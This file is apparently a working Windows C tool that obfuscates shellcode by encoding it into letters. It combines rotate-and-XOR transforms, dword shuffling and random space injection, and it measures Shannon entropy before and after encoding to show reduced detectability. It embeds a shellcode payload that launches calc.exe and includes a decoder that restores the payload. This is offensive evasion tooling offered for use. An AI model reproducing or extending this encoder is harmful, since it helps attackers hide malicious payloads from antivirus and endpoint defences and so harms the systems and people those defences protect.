#include <Windows.h>
#include <math.h>   // for log2 function
#include <stdio.h>

// ============================================================================================================================================================

//
#define SHUFFLE_ORDER

//
#define INJECT_SPACES

// ============================================================================================================================================================

#define ROTL8(x,n)  ((BYTE) ( ((UINT8)(x) << (n)) | ((UINT8)(x) >> (8 - (n))) ) & 0xFF)
#define ROTR8(x,n)  ((BYTE) ( ((UINT8)(x) >> (n)) | ((UINT8)(x) << (8 - (n))) ) & 0xFF)

#define XOR_VALUE    0xA5

#ifdef INJECT_SPACES

#define MIN_SPACE_INJECT  3
#define MAX_SPACE_INJECT  5

#endif // INJECT_SPACES


// ============================================================================================================================================================

extern int __cdecl _rdrand32_step(unsigned int*);


static BOOL RtlGenRandom(OUT PBYTE pRndValue) 
{

    unsigned int uiRndValue = 0x00;

    for (int i = 0; i < 10; i++)
    {
        if (_rdrand32_step(&uiRndValue))
        {
            *pRndValue = (BYTE)(uiRndValue & 0xFF);
            return TRUE;
        }
    }
   
    return FALSE;  
}


static __inline BOOL IsAlphabatical(BYTE c)
{
	return (c >= 'A' && c <= 'Z');
}

static BOOL GetAlphabeticalOffset(IN BYTE bPlainByte, OUT PBYTE pbOffset, OUT PBYTE pbTransformed)
{
    BYTE    bRndmStart      = 0x00,
            bIndex          = 0x00,
            bBaseByte       = 0x00,
            bCandidateOff   = 0x00,
            bTmpTransf      = 0x00;

    if (!RtlGenRandom(&bRndmStart))        
        return FALSE;

    bRndmStart %= 26;

    for (BYTE i = 0; i < 26; i++)
    {
        bIndex          = (BYTE)(bRndmStart + i) % 26;
        bBaseByte       = (BYTE)'A';
        bCandidateOff   = (BYTE)(bBaseByte + bIndex);
        bTmpTransf      = (BYTE)(ROTL8((bPlainByte + bCandidateOff), 4) ^ XOR_VALUE);

        if (IsAlphabatical(bTmpTransf))                                
        {                           
            *pbOffset       = bCandidateOff;
            *pbTransformed  = bTmpTransf;
            return TRUE;                                                       
        }
    }

    // Fallback
    *pbOffset       = (BYTE)('A' + (bRndmStart % 26));
    *pbTransformed  = (BYTE)(ROTL8((bPlainByte + *pbOffset), 4) ^ XOR_VALUE);
    return TRUE;
}

// ============================================================================================================================================================



BOOL AlphabaticalShellcodeEncode(IN PBYTE pRawHexShellcode, IN DWORD dwRawHexShellcodeSize, OUT PBYTE* ppEncodedShellcode, OUT PDWORD pdwEncodedShellcodeSize) {

    PWORD   pwEncodedBuffer         = NULL;
    PBYTE   pEncodedSpacedBuffer    = NULL;
    PBYTE   pTempShellcode          = NULL;

    if (!pRawHexShellcode || !dwRawHexShellcodeSize || !ppEncodedShellcode || !pdwEncodedShellcodeSize)
        return FALSE;

    if (dwRawHexShellcodeSize > (SIZE_MAX / sizeof(WORD)))
        return FALSE;

    *pdwEncodedShellcodeSize    = dwRawHexShellcodeSize * sizeof(WORD);   
    *ppEncodedShellcode         = NULL;

    if (!(pwEncodedBuffer = (PWORD)LocalAlloc(LPTR, *pdwEncodedShellcodeSize)))
        return FALSE;

    if (!(pTempShellcode = (PBYTE)LocalAlloc(LPTR, dwRawHexShellcodeSize)))
        goto _END_OF_FUNC;

    RtlCopyMemory(pTempShellcode, pRawHexShellcode, dwRawHexShellcodeSize);

#ifdef SHUFFLE_ORDER

    DWORD   dwRoundedDownSize   = dwRawHexShellcodeSize & ~0x3;
	DWORD   dwTotalDwords       = dwRoundedDownSize / sizeof(DWORD); 
    PDWORD  pdwRawHexShellcode  = (PDWORD)pTempShellcode;

    for (DWORD i = 0; i < dwTotalDwords; i++)
    {
        pdwRawHexShellcode[i] = (((pdwRawHexShellcode[i] << 16) | (pdwRawHexShellcode[i] >> 16)) & 0xFFFFFFFFu);
    }

#endif 

   for (DWORD i = 0; i < dwRawHexShellcodeSize; i++) 
   {
        BYTE    bRndmValue      = 0x00,
                bOffset         = 0x00,
                bTransformed    = 0x00;

        if (!GetAlphabeticalOffset(pTempShellcode[i], &bOffset, &bTransformed)) { goto _END_OF_FUNC; }


        pwEncodedBuffer[i]      = (WORD)((bOffset << 8) | bTransformed);                       
   }

#ifdef INJECT_SPACES
    DWORD dwEncodedSpacedSize     = (*pdwEncodedShellcodeSize / MIN_SPACE_INJECT) + *pdwEncodedShellcodeSize;
    DWORD dwRandomNumber          = 0;
    DWORD dwRealEncodedSpacedSize = 0;
    PBYTE pEncodedBuffer          = (PBYTE)pwEncodedBuffer;      

    if (!(pEncodedSpacedBuffer = (PBYTE)LocalAlloc(LPTR, dwEncodedSpacedSize)))
        goto _END_OF_FUNC;

    if (!RtlGenRandom((PBYTE)&dwRandomNumber)) goto _END_OF_FUNC;

    dwRandomNumber = MIN_SPACE_INJECT + (dwRandomNumber % (MAX_SPACE_INJECT - MIN_SPACE_INJECT + 1));

    for (DWORD i = 0, j = 0; i < *pdwEncodedShellcodeSize; ++i, --dwRandomNumber)
    {
        pEncodedSpacedBuffer[j++] = pEncodedBuffer[i];
        ++dwRealEncodedSpacedSize;

        if (dwRandomNumber == 0)
        {
            DWORD dwRndEvenOdd = 0;

            if (!RtlGenRandom((PBYTE)&dwRndEvenOdd)) goto _END_OF_FUNC;

			// 50% chance to inject a space
            // if ((dwRndEvenOdd & 1) == 0)                        

			// 75% chance to inject a space
            if ((dwRndEvenOdd % 4) != 3)
            {
                if (j >= dwEncodedSpacedSize) goto _END_OF_FUNC;

                pEncodedSpacedBuffer[j++] = ' ';
                ++dwRealEncodedSpacedSize;
            }

            if (!RtlGenRandom((PBYTE)&dwRandomNumber)) goto _END_OF_FUNC;
            dwRandomNumber = MIN_SPACE_INJECT + (dwRandomNumber % (MAX_SPACE_INJECT - MIN_SPACE_INJECT + 1));
        }
    }

    LocalFree(pwEncodedBuffer);
    pwEncodedBuffer = NULL;

    *ppEncodedShellcode      = pEncodedSpacedBuffer;
    *pdwEncodedShellcodeSize = dwRealEncodedSpacedSize;
#else
    *ppEncodedShellcode      = (PBYTE)pwEncodedBuffer;
#endif


_END_OF_FUNC:
   if (pTempShellcode)
       LocalFree(pTempShellcode);
#ifdef INJECT_SPACES
   if (!*ppEncodedShellcode && pEncodedSpacedBuffer)
       LocalFree(pEncodedSpacedBuffer);
#else
   if (!*ppEncodedShellcode && pwEncodedBuffer)
       LocalFree(pwEncodedBuffer);
#endif
   return (*ppEncodedShellcode != NULL);
}

// ============================================================================================================================================================




#ifdef INJECT_SPACES

static PBYTE StripSpaces(IN PBYTE pEncodedShellcode, IN DWORD dwEncodedShellcodeSize, OUT PDWORD pdwStrippedSize) 
{
	if (!pEncodedShellcode || dwEncodedShellcodeSize == 0 || !pdwStrippedSize) return NULL;
	
    DWORD   dwStrippedSize  = 0x00;
	PBYTE   pStrippedBuffer = (PBYTE)LocalAlloc(LPTR, dwEncodedShellcodeSize);

	if (!pStrippedBuffer) return NULL;

	for (DWORD i = 0; i < dwEncodedShellcodeSize; i++) {
		if (pEncodedShellcode[i] != ' ') 
        {
			pStrippedBuffer[dwStrippedSize++] = pEncodedShellcode[i];
		}
	}
	
    *pdwStrippedSize = dwStrippedSize;
	return pStrippedBuffer;
}

#endif 



BOOL AlphabaticalShellcodeDecode(IN PWORD pEncodedShellcode, IN DWORD dwEncodedShellcodeSize, OUT PBYTE* ppDecodedShellcode, OUT PDWORD pdwDecodedShellcodeSize) {

    PBYTE  pCleanBuffer     = NULL;
    PWORD  pwCleanEncoded   = NULL;
    DWORD  dwCleanSize      = 0x00;
    BOOL   bNeedFree        = FALSE;

    if (!pEncodedShellcode || !dwEncodedShellcodeSize || !ppDecodedShellcode || !pdwDecodedShellcodeSize)
        return FALSE;

#ifdef INJECT_SPACES
    
    pCleanBuffer = StripSpaces(pEncodedShellcode, dwEncodedShellcodeSize, &dwCleanSize);
    
    if (!pCleanBuffer || (dwCleanSize & 1)) 
        goto _END_OF_FUNC;

    bNeedFree = TRUE;
#else
    pCleanBuffer    = pEncodedShellcode;
    dwCleanSize     = dwEncodedShellcodeSize;
#endif

    *pdwDecodedShellcodeSize = dwCleanSize / sizeof(WORD);

    if (!(*ppDecodedShellcode = (PBYTE)LocalAlloc(LPTR, *pdwDecodedShellcodeSize)))
        goto _END_OF_FUNC;

    pwCleanEncoded = (PWORD)pCleanBuffer;

    for (DWORD i = 0; i < *pdwDecodedShellcodeSize; i++)
    {
        BYTE    bOffset             = 0x00,
                bTransformed        = 0x00,
                bDecoded            = 0x00;

        bTransformed                = (BYTE)(pwCleanEncoded[i] & 0xFF);
        bOffset                     = (BYTE)(pwCleanEncoded[i] >> 8);
        bDecoded                    = ROTR8((bTransformed ^ XOR_VALUE), 4);

        (*ppDecodedShellcode)[i]    = bDecoded - bOffset;
    }


#ifdef SHUFFLE_ORDER

    DWORD   dwRoundedDownSize   = (dwCleanSize / sizeof(WORD)) & ~0x3;
    DWORD   dwTotalDwords       = dwRoundedDownSize / sizeof(DWORD);
    PDWORD  pdwRawHexShellcode  = (PDWORD)(*ppDecodedShellcode);

    for (DWORD i = 0; i < dwTotalDwords; i++)
    {
        pdwRawHexShellcode[i] = (((pdwRawHexShellcode[i] << 16) | (pdwRawHexShellcode[i] >> 16)) & 0xFFFFFFFFu);
    }

#endif 


_END_OF_FUNC:
#ifdef INJECT_SPACES
    if (bNeedFree && pCleanBuffer)
        LocalFree(pCleanBuffer);
#endif
    return (*ppDecodedShellcode != NULL);
}


// ============================================================================================================================================================

VOID PrintHexAscii(IN LPCWSTR szName, IN PBYTE pBuffer, IN DWORD dwBufferLength) {

    DWORD dwIndex = 0x00;

    wprintf(L"\n[*] %s Hex Ascii Dump:\n", szName);
    wprintf(L"[*] Address\t\tHex\t\tAscii\n");
    wprintf(L"[*] ----------------------------------------\n");

    for (dwIndex = 0x00; dwIndex < dwBufferLength; dwIndex++) {
        if ((dwIndex % 16) == 0) {
            wprintf(L"[*] 0x%08X\t", dwIndex);
        }
        wprintf(L"%02X ", pBuffer[dwIndex]);
        if ((dwIndex % 16) == 15) {
            wprintf(L"\t");
            for (DWORD i = dwIndex - 15; i <= dwIndex; i++) {
                if (pBuffer[i] >= 0x20 && pBuffer[i] <= 0x7E) {
                    wprintf(L"%c", pBuffer[i]);
                }
                else {
                    wprintf(L".");
                }
            }
            wprintf(L"\n");
        }
    }
    if ((dwIndex % 16) != 0) {
        wprintf(L"\n");
    }
}


VOID PrintHexArray(IN CONST CHAR* cArrayName, IN PBYTE pBufferData, IN SIZE_T sBufferSize) {

    printf("\nunsigned char %s[%d] = {", cArrayName, (int)sBufferSize);

    for (SIZE_T x = 0; x < sBufferSize; x++) {

        if (x % 16 == 0)
            printf("\n    ");

        if (x == sBufferSize - 1)
            printf("0x%0.2X", pBufferData[x]);
        else
            printf("0x%0.2X, ", pBufferData[x]);
    }

    printf("\n};\n");
}



DOUBLE CalculateShannonEntropy(IN PBYTE pBuffer, IN DWORD dwBufferSize) {

	if (!pBuffer || !dwBufferSize)
		return 00.0;

	DWORD	dwFrequency[256]	= { 0 };
	DOUBLE	dProbability		= 00.0,
			dEntropy			= 00.0;

	for (int i = 0; i < dwBufferSize; i++)
	{
		dwFrequency[pBuffer[i]]++;
	}

	for (int i = 0; i < 256; i++)
	{
		if (dwFrequency[i] == 0) continue;

		dProbability	= (DOUBLE)dwFrequency[i] / (DOUBLE)dwBufferSize;
		dEntropy		-= dProbability * log2(dProbability);
			
	}

	return dEntropy;
}



// ============================================================================================================================================================
// ============================================================================================================================================================


unsigned char PlainTextShellcode[276] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
    0x65, 0x78, 0x65, 0x00
};




// ============================================================================================================================================================
// ============================================================================================================================================================



int main() {
    
	DOUBLE  dEntropy                = CalculateShannonEntropy(PlainTextShellcode, sizeof(PlainTextShellcode));
    PBYTE   pEncodedShellcode       = NULL;
    DWORD   dwEncodedShellcodeLen   = 0x00;
    PCHAR   pPrintableShellcode     = NULL;

    if (!AlphabaticalShellcodeEncode(PlainTextShellcode, sizeof(PlainTextShellcode), &pEncodedShellcode, &dwEncodedShellcodeLen))
    {
        return -1;
    }

    if (!(pPrintableShellcode = (PCHAR)LocalAlloc(LPTR, dwEncodedShellcodeLen + 1)))
    {
        LocalFree(pEncodedShellcode);
        return -1;
    }

    RtlCopyMemory(pPrintableShellcode, pEncodedShellcode, dwEncodedShellcodeLen);
    pPrintableShellcode[dwEncodedShellcodeLen] = '\0';

    PrintHexAscii(L"Encoded Shellcode", (PBYTE)pEncodedShellcode, dwEncodedShellcodeLen);
    printf("\n\n");

    printf("[*] Encoded Shellcode Length: %lu bytes\n", dwEncodedShellcodeLen);


    printf("[*] Shannon Entropy of Plain Text Shellcode: %.2f\n", dEntropy);
    dEntropy = CalculateShannonEntropy(pEncodedShellcode, dwEncodedShellcodeLen);
    printf("[*] Shannon Entropy of The Encoded Shellcode: %.2f\n", dEntropy);

    
    //\
    printf("[*] Encoded Shellcode:\n\n%.*s\n", dwEncodedShellcodeLen, (CHAR*)pPrintableShellcode);


    PBYTE   pDecodedShellcode       = NULL;
    DWORD   dwDecodedShellcodeLen   = 0x00;


    if (!AlphabaticalShellcodeDecode(pEncodedShellcode, dwEncodedShellcodeLen, &pDecodedShellcode, &dwDecodedShellcodeLen))
    {
        return -1;
    }

    PrintHexAscii(L"Decoded Shellcode", pDecodedShellcode, dwDecodedShellcodeLen);
    printf("\n\n");

    if (dwDecodedShellcodeLen != sizeof(PlainTextShellcode) ||
        memcmp(PlainTextShellcode, pDecodedShellcode, dwDecodedShellcodeLen) != 0)
    {
        printf("[!] Mismatch Detected: Decoded Output Does Not Match Original Input.\n");
    }
    else
    {
        printf("[+] Success: Decoded Shellcode Matches Original.\n");
    }




    LocalFree(pPrintableShellcode);
    LocalFree(pEncodedShellcode);
    LocalFree(pDecodedShellcode);

    return 0;

}
